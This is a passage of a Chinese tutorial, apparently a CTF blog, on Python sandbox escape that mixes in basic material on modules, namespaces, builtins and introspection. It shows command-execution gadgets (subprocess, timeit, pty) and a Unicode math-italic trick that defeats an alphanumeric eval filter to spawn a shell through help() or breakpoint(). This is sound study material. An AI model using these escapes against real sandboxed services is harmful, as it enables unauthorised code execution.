+<tr>
+<td><code>getoutput</code></td>
+<td>py3</td>
+<td><code>str</code>（命令输出）</td>
+<td>无</td>
+<td>✅（直接返回 stdout）</td>
+<td><strong>总是 shell&#x3D;True</strong></td>
+</tr>
+<tr>
+<td><code>getstatusoutput</code></td>
+<td>py3</td>
+<td><code>(int, str)</code></td>
+<td>无</td>
+<td>✅（返回 exit code 和 stdout）</td>
+<td><strong>总是 shell&#x3D;True</strong></td>
+</tr>
+</tbody></table>
+<h4 id="Popen-系列（底层构造，灵活度最高）"><a href="#Popen-系列（底层构造，灵活度最高）" class="headerlink" title="Popen 系列（底层构造，灵活度最高）"></a><code>Popen</code> 系列（底层构造，灵活度最高）</h4><p>直接启动一个新进程，可以配置 <code>stdin</code> &#x2F; <code>stdout</code> &#x2F; <code>stderr</code> 管道、是否用 shell。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">subprocess.Popen(args, bufsize=-<span class="number">1</span>, executable=<span class="literal">None</span>,</span><br><span class="line">                 stdin=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>,</span><br><span class="line">                 shell=<span class="literal">False</span>, cwd=<span class="literal">None</span>, env=<span class="literal">None</span>, ...)</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li><code>args</code>：要执行的命令（字符串或列表）</li>
+<li><code>stdout</code> &#x2F; <code>stderr</code> &#x2F; <code>stdin</code>：控制标准流（默认继承父进程）</li>
+<li><code>shell</code>：是否通过 shell 执行（<code>/bin/sh</code> 或 <code>cmd.exe</code>）</li>
+</ul>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="comment"># 执行命令并读取输出</span></span><br><span class="line">subprocess.Popen(</span><br><span class="line">    <span class="string">&#x27;ls&#x27;</span>,                     <span class="comment"># args：要执行的命令（因为 shell=True，所以是字符串）</span></span><br><span class="line">    shell=<span class="literal">True</span>,               <span class="comment"># 通过 shell 运行（Linux 默认 /bin/sh）</span></span><br><span class="line">    stdout=subprocess.PIPE,   <span class="comment"># 把子进程的 stdout 重定向到管道</span></span><br><span class="line">    stderr=subprocess.STDOUT  <span class="comment"># 把 stderr 合并到 stdout</span></span><br><span class="line">).stdout.read()               <span class="comment"># 从 stdout 管道中一次性读取全部内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 沙箱绕过：动态导入</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="阻塞执行并获取状态-输出"><a href="#阻塞执行并获取状态-输出" class="headerlink" title="阻塞执行并获取状态&#x2F;输出"></a>阻塞执行并获取状态&#x2F;输出</h4><p>调用后会等外部命令执行结束再返回（除非超时或被信号中断）</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)          <span class="comment"># 返回 exit code</span></span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)    <span class="comment"># exit code !=0 抛异常</span></span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)  <span class="comment"># 返回输出（str）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)           <span class="comment"># 返回 CompletedProcess 对象</span></span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)                 <span class="comment"># 返回输出（简化版）</span></span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)           <span class="comment"># 返回 (exit_code, output)</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)          <span class="comment"># 同 py2</span></span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)    <span class="comment"># 同 py2</span></span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)  <span class="comment"># 同 py2</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="timeit-模块"><a href="#timeit-模块" class="headerlink" title="timeit 模块"></a>timeit 模块</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="platform-模块"><a href="#platform-模块" class="headerlink" title="platform 模块"></a>platform 模块</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">platform.os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="pty-模块"><a href="#pty-模块" class="headerlink" title="pty 模块"></a>pty 模块</h3><p>仅限 Linux 环境</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="后门命令"><a href="#后门命令" class="headerlink" title="后门命令"></a>后门命令</h3><h4 id="help-函数"><a href="#help-函数" class="headerlink" title="help 函数"></a>help 函数</h4><p>以下面的环境为例</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>])</span><br></pre></td></tr></table></figure></div>
+
+<p>当我们输入 <code>help</code> 时，help 函数会打开帮助</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">𝘩𝘦𝘭𝘱()</span><br></pre></td></tr></table></figure></div>
+
+
+  <div class="note-large red">
+    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
+      <p>注意</p>
+
+    </div>
+    <div class="notel-content markdown-body">
+      <p>你输入 ASCII 的 <code>help()</code> 会被正则干掉；但用了 <strong>数学斜体字母</strong> <code>𝘩𝘦𝘭𝘱()</code>（非 ASCII），配合 <strong>PEP 3131 的 NFKC 规范化</strong>，标识符会被归一化为 <code>help()</code>，于是成功调用到 <code>builtins.help</code>。</p>
+
+    </div>
+  </div>
+
+<p>然后输入 <code>os</code>，此时会进入 <code>os</code> 的帮助文档。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>&gt; os</span><br></pre></td></tr></table></figure></div>
+
+<p>然后在输入 <code>!sh</code> 就可以拿到 <code>/bin/sh</code>, 输入 <code>!bash</code> 则可以拿到 <code>/bin/bash</code>。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">help&gt; os</span><br><span class="line">$ ls</span><br><span class="line">a-z0-9.py  exp2.py  exp.py  flag.txt</span><br><span class="line">$ </span><br></pre></td></tr></table></figure></div>
+
+<h4 id="breakpoint-函数"><a href="#breakpoint-函数" class="headerlink" title="breakpoint 函数"></a>breakpoint 函数</h4><p><code>breakpoint</code> 是从 Python <strong>3.7</strong> 开始引入的一个内置函数。默认行为：调用 <code>sys.breakpointhook()</code> → 启动 <code>pdb.set_trace()</code>，也就是进入 <strong>Pdb</strong>（Python 调试器）。</p>
+<p>在 Pdb 提示符 <code>(Pdb)</code> 里，你可以查看变量、执行表达式，甚至运行任意 Python 语句。在输入 <code>breakpoint()</code> 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;stdin&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;<span class="literal">None</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br><span class="line"><span class="number">0</span></span><br><span class="line">(Pdb) <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">$ ls</span><br><span class="line">a-z0-<span class="number">9.</span>py  exp2.py  exp.py  flag.txt</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="常见沙箱"><a href="#常见沙箱" class="headerlink" title="常见沙箱"></a>常见沙箱</h1><h1 id="Python-程序结构"><a href="#Python-程序结构" class="headerlink" title="Python 程序结构"></a>Python 程序结构</h1><h2 id="模块（Module）"><a href="#模块（Module）" class="headerlink" title="模块（Module）"></a>模块（Module）</h2><p>在 Python 中<strong>模块（Module）</strong>就是一个 <code>.py</code> 文件。当你 <code>import</code> 它时，Python 会<strong>先运行一次</strong>这个文件里的代码，然后把运行结果打包成一个<strong>模块对象</strong>。这个模块对象里保存了你在文件里定义的变量、函数和类，这个保存空间就是它的<strong>命名空间</strong>（其实就是一个字典，键是名字，值是对象）。</p>
+<p>Python 会把这个模块对象<strong>存到一个全局字典 <code>sys.modules</code> 里</strong>，下次你再导入同名模块，就直接从这个字典里拿现成的，不会再运行一次文件里的代码。</p>
+<h2 id="包（Package）"><a href="#包（Package）" class="headerlink" title="包（Package）"></a>包（Package）</h2><p><strong>包（Package）</strong>是包含 <code>__init__.py</code> 文件的目录，用于将多个模块按层次结构组织起来。包的作用是<strong>把多个模块按层次结构组织起来</strong>，就像文件夹管理文件一样。</p>
+<p>技术上，<strong>包也是 <code>&lt;class &#39;module&#39;&gt;</code> 对象</strong>。包和模块唯一区别是：普通模块来源是一个 <code>.py</code> 文件；包来源是一个 **目录 + <code>__init__.py</code>**。</p>
+<p>另外包里面既可以包含<strong>模块</strong>还可以包含<strong>其他的包</strong>。在包对应的目录下：</p>
+<ul>
+<li><p><code>.py</code> 文件 → 子模块</p>
+</li>
+<li><p>目录（含 <code>__init__.py</code>）→ 子包</p>
+</li>
+</ul>
+<p>导入时，这些子模块 &#x2F; 子包会被加载为模块对象，并<strong>放进所在包的命名空间里</strong>。例如：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mypkg.subpkg.mod</span><br></pre></td></tr></table></figure></div>
+
+<p>会让：</p>
+<ul>
+<li><code>mypkg.__dict__[&#39;subpkg&#39;]</code> 保存 <code>&lt;module &#39;mypkg.subpkg&#39;&gt;</code></li>
+<li><code>mypkg.subpkg.__dict__[&#39;mod&#39;]</code> 保存 <code>&lt;module &#39;mypkg.subpkg.mod&#39;&gt;</code></li>
+</ul>
+<h2 id="命名空间（Namespace）"><a href="#命名空间（Namespace）" class="headerlink" title="命名空间（Namespace）"></a>命名空间（Namespace）</h2><p><strong>命名空间（Namespace）</strong>就是<strong>名字到对象的映射关系</strong>，本质是一个字典，用来存放“某个名字当前指向哪个对象”的信息。</p>
+<p>Python 中几乎所有东西（变量、函数、类、模块、包）都是对象，命名空间就是这些名字的存放位置。</p>
+<p>常见的几类命名空间：</p>
+<ul>
+<li><strong>局部命名空间（Local）</strong>：函数或方法内部定义的名字（参数、局部变量等）。</li>
+<li><strong>闭包命名空间（Enclosing）</strong>：嵌套函数的外层函数作用域。</li>
+<li><strong>全局命名空间（Global）</strong>：一个模块文件顶层定义的名字（模块级变量、函数、类等）。</li>
+<li><strong>内置命名空间（Builtins）</strong>：Python 启动时加载的内置名字（<code>len</code>、<code>print</code>、<code>Exception</code> 等）。</li>
+</ul>
+<p>变量查找遵循 <strong>LEGB</strong>（ <strong>L</strong>ocal → <strong>E</strong>nclosing → <strong>G</strong>lobal → <strong>B</strong>uiltins） 顺序，找不到就抛 <code>NameError</code>，<strong>保证了不同作用域的变量互不冲突</strong>。</p>
+<p>在 Python 中，我们可以通过 <code>globals()</code> 和 <code>locals()</code> 函数分别获取<strong>当前模块的全局命名空间</strong>和<strong>当前作用域的局部命名空间</strong>，另外模块的 <code>__dict__</code> 属性表示的是模块的命名空间。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">globals</span>())      <span class="comment"># 当前模块的全局命名空间</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>())       <span class="comment"># 当前作用域的局部命名空间</span></span><br><span class="line"><span class="built_in">print</span>(math.__dict__)  <span class="comment"># math 模块的命名空间</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="builtins-模块"><a href="#builtins-模块" class="headerlink" title="builtins 模块"></a>builtins 模块</h1><h2 id="什么是-builtins？"><a href="#什么是-builtins？" class="headerlink" title="什么是 builtins？"></a>什么是 builtins？</h2><p>在 Python 中，有一组功能是<strong>默认就可以用的</strong>，比如：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="built_in">len</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="built_in">int</span>(<span class="string">&quot;123&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>这些函数我们<strong>从来没导入过</strong>，就可以直接用。其实它们都来自于一个叫 <code>builtins</code> 的模块。</p>
+<p><strong><code>builtins</code> 是 Python 解释器自动导入的模块，包含了 Python 所有的内置函数、类型、异常、常量等。</strong></p>
+<p>你可以这样访问它：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(builtins))  <span class="comment"># 列出其中所有内容</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="builtins-模块内容"><a href="#builtins-模块内容" class="headerlink" title="builtins 模块内容"></a>builtins 模块内容</h2><h3 id="内置函数（Built-in-Functions）"><a href="#内置函数（Built-in-Functions）" class="headerlink" title="内置函数（Built-in Functions）"></a>内置函数（Built-in Functions）</h3><p>这是我们最熟悉的一类，直接上常用函数举例：</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>用途说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>print()</code></td>
+<td>打印输出</td>
+</tr>
+<tr>
+<td><code>len()</code></td>
+<td>获取长度</td>
+</tr>
+<tr>
+<td><code>type()</code></td>
+<td>获取类型</td>
+</tr>
+<tr>
+<td><code>int()</code></td>
+<td>转换整数</td>
+</tr>
+<tr>
+<td><code>str()</code></td>
+<td>转换字符串</td>
+</tr>
+<tr>
+<td><code>input()</code></td>
+<td>获取用户输入</td>
+</tr>
+<tr>
+<td><code>max()</code>&#x2F;<code>min()</code></td>
+<td>获取最大&#x2F;最小</td>
+</tr>
+<tr>
+<td><code>sum()</code></td>
+<td>求和</td>
+</tr>
+<tr>
+<td><code>sorted()</code></td>
+<td>排序</td>
+</tr>
+<tr>
+<td><code>range()</code></td>
+<td>生成范围迭代器</td>
+</tr>
+<tr>
+<td><code>abs()</code></td>
+<td>绝对值</td>
+</tr>
+<tr>
+<td><code>isinstance()</code></td>
+<td>判断对象类型</td>
+</tr>
+<tr>
+<td><code>enumerate()</code></td>
+<td>获取下标+元素</td>
+</tr>
+<tr>
+<td><code>zip()</code></td>
+<td>打包多个迭代器</td>
+</tr>
+<tr>
+<td><code>eval()</code> &#x2F; <code>exec()</code></td>
+<td>动态执行字符串代码（危险函数，慎用）</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>🔍 这些函数本质上等价于 <code>builtins.print()</code>、<code>builtins.len()</code> 等，但我们用的时候可以省略 <code>builtins.</code>，因为它们自动导入到当前作用域中。</p>
+</blockquote>
+<h3 id="内置类型（Built-in-Types）"><a href="#内置类型（Built-in-Types）" class="headerlink" title="内置类型（Built-in Types）"></a>内置类型（Built-in Types）</h3><p>这些是 Python 的核心数据类型，都是类（<code>type</code>），可实例化。</p>
+<table>
+<thead>
+<tr>
+<th>类型名称</th>
+<th>示例</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>int</code></td>
+<td><code>int(123)</code></td>
+<td>整数类型</td>
+</tr>
+<tr>
+<td><code>float</code></td>
+<td><code>float(3.14)</code></td>
+<td>浮点数类型</td>
+</tr>
+<tr>
+<td><code>str</code></td>
+<td><code>&#39;abc&#39;</code></td>
+<td>字符串</td>
+</tr>
+<tr>
+<td><code>bool</code></td>
+<td><code>True</code> &#x2F; <code>False</code></td>
+<td>布尔值</td>
+</tr>
+<tr>
+<td><code>list</code></td>
+<td><code>[1,2,3]</code></td>
+<td>列表</td>
+</tr>
+<tr>
+<td><code>tuple</code></td>
+<td><code>(1,2,3)</code></td>
+<td>元组</td>
+</tr>
+<tr>
+<td><code>dict</code></td>
+<td><code>&#123;&#39;a&#39;:1&#125;</code></td>
+<td>字典</td>
+</tr>
+<tr>
+<td><code>set</code></td>
+<td><code>&#123;1,2,3&#125;</code></td>
+<td>集合</td>
+</tr>
+<tr>
+<td><code>bytes</code></td>
+<td><code>b&#39;abc&#39;</code></td>
+<td>字节序列</td>
+</tr>
+<tr>
+<td><code>complex</code></td>
+<td><code>1+2j</code></td>
+<td>复数</td>
+</tr>
+<tr>
+<td><code>object</code></td>
+<td>所有类的父类</td>
+<td></td>
+</tr>
+<tr>
+<td><code>type</code></td>
+<td>所有类型的元类</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>这些你可以当作构造函数使用，也可以用来做类型判断。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">isinstance</span>(<span class="number">123</span>, <span class="built_in">int</span>)  <span class="comment"># True</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="内置异常（Built-in-Exceptions）"><a href="#内置异常（Built-in-Exceptions）" class="headerlink" title="内置异常（Built-in Exceptions）"></a>内置异常（Built-in Exceptions）</h3><p>Python 中所有异常类型也都定义在 <code>builtins</code> 中，比如：</p>
+<table>
+<thead>
+<tr>
+<th>异常名称</th>
+<th>触发场景</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Exception</code></td>
+<td>所有异常的基类</td>
+</tr>
+<tr>
+<td><code>ValueError</code></td>
+<td>值不合法</td>
+</tr>
+<tr>
+<td><code>TypeError</code></td>
+<td>类型不合法</td>
+</tr>
+<tr>
+<td><code>NameError</code></td>
+<td>变量未定义</td>
+</tr>
+<tr>
+<td><code>IndexError</code></td>
+<td>索引越界</td>
+</tr>
+<tr>
+<td><code>KeyError</code></td>
+<td>字典键不存在</td>
+</tr>
+<tr>
+<td><code>AttributeError</code></td>
+<td>属性不存在</td>
+</tr>
+<tr>
+<td><code>ZeroDivisionError</code></td>
+<td>除以零</td>
+</tr>
+<tr>
+<td><code>ImportError</code> &#x2F; <code>ModuleNotFoundError</code></td>
+<td>导入失败</td>
+</tr>
+<tr>
+<td><code>SyntaxError</code></td>
+<td>语法错误（解释器发现）</td>
+</tr>
+<tr>
+<td><code>IndentationError</code></td>
+<td>缩进错误</td>
+</tr>
+</tbody></table>
+<p>使用示例：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="number">1</span> / <span class="number">0</span></span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;除零错误&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="内置常量（Built-in-Constants）"><a href="#内置常量（Built-in-Constants）" class="headerlink" title="内置常量（Built-in Constants）"></a>内置常量（Built-in Constants）</h3><p>这些是所有 Python 代码中都会默认可用的固定值：</p>
+<table>
+<thead>
+<tr>
+<th>常量</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>True</code></td>
+<td>布尔真</td>
+</tr>
+<tr>
+<td><code>False</code></td>
+<td>布尔假</td>
+</tr>
+<tr>
+<td><code>None</code></td>
+<td>空值&#x2F;无返回值</td>
+</tr>
+<tr>
+<td><code>Ellipsis</code></td>
+<td><code>...</code>，可用作占位符</td>
+</tr>
+<tr>
+<td><code>NotImplemented</code></td>
+<td>某些操作未实现时返回的特殊值</td>
+</tr>
+</tbody></table>
+<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><h3 id="动态修改内置函数"><a href="#动态修改内置函数" class="headerlink" title="动态修改内置函数"></a>动态修改内置函数</h3><p>如果你想重写一个内置函数，但仍然希望在某些情况下调用原始的内置函数，可以通过导入并使用 <code>builtins</code> 模块来实现。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改 print 的行为</span></span><br><span class="line"><span class="built_in">print</span> = <span class="keyword">lambda</span> *args, **kwargs: builtins.<span class="built_in">print</span>(<span class="string">&quot;【DEBUG】&quot;</span>, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello&quot;</span>)  <span class="comment"># 输出： 【DEBUG】 Hello</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="控制可用的内置函数"><a href="#控制可用的内置函数" class="headerlink" title="控制可用的内置函数"></a>控制可用的内置函数</h3><p>在使用 <code>eval()</code> 或 <code>exec()</code> 动态执行代码时，可以通过设置全局字典中的 <code>__builtins__</code> 项，<strong>控制哪些内置函数可用或完全禁用内置功能</strong>。</p>
+<p>这是一种用于 <strong>沙箱（sandbox）安全隔离</strong>、<strong>限制运行环境</strong> 的技巧，常用于执行用户提供的代码但限制其权限。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&quot;print(&#x27;hello&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">eval</span>(code, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)  <span class="comment"># ⛔ 报错：name &#x27;print&#x27; is not defined</span></span><br></pre></td></tr></table></figure></div>
+
+<h1 id="内省机制（Introspection）"><a href="#内省机制（Introspection）" class="headerlink" title="内省机制（Introspection）"></a>内省机制（Introspection）</h1><p>Python 的 <strong>内省机制（Introspection）</strong> 是指程序在 <strong>运行时</strong> 可以检查<strong>对象</strong>的<strong>类型、属性、结构、方法</strong>等信息的能力。这也是 Python 被称为“动态语言”或“高度自省语言”的一个重要原因。</p>
+<h2 id="对象的类型-结构"><a href="#对象的类型-结构" class="headerlink" title="对象的类型&#x2F;结构"></a>对象的类型&#x2F;结构</h2><table>
+<thead>
+<tr>
+<th>工具&#x2F;函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>type(obj)</code></td>
+<td>返回对象的类型</td>
+</tr>
+<tr>
+<td><code>id(obj)</code></td>
+<td>返回对象的内存地址（唯一标识）</td>
+</tr>
+<tr>
+<td><code>isinstance(obj, T)</code></td>
+<td>判断对象是否为某类或其子类</td>
+</tr>
+<tr>
+<td><code>issubclass(A, B)</code></td>
+<td>判断类 A 是否是类 B 的子类</td>
+</tr>
+<tr>
+<td><code>callable(obj)</code></td>
+<td>判断对象是否可调用（函数&#x2F;类等）</td>
+</tr>
+</tbody></table>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="string">&quot;hello&quot;</span>))         <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(<span class="number">123</span>, <span class="built_in">int</span>))  <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">callable</span>(<span class="built_in">len</span>))         <span class="comment"># True</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="获取对象成员"><a href="#获取对象成员" class="headerlink" title="获取对象成员"></a>获取对象成员</h2><table>
+<thead>
+<tr>
+<th>工具&#x2F;函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>dir(obj)</code></td>
+<td>列出对象的所有属性和方法名</td>
+</tr>
+<tr>
+<td><code>hasattr(obj, name)</code></td>
+<td>判断是否有属性</td>
+</tr>
+<tr>
+<td><code>getattr(obj, name)</code></td>
+<td>动态获取属性</td>
+</tr>
+<tr>
+<td><code>setattr(obj, name, value)</code></td>
+<td>设置属性值</td>
+</tr>
+<tr>
+<td><code>delattr(obj, name)</code></td>
+<td>删除属性</td>
+</tr>
+</tbody></table>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>): <span class="variable language_">self</span>.name = <span class="string">&quot;Tom&quot;</span></span><br><span class="line"></span><br><span class="line">p = Person()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(p))                 <span class="comment"># 所有方法和属性</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(p, <span class="string">&#x27;name&#x27;</span>))     <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">getattr</span>(p, <span class="string">&#x27;name&#x27;</span>))     <span class="comment"># &quot;Tom&quot;</span></span><br><span class="line"><span class="built_in">setattr</span>(p, <span class="string">&#x27;age&#x27;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="built_in">print</span>(p.age)                  <span class="comment"># 18</span></span><br></pre></td></tr></table></figure></div>
+
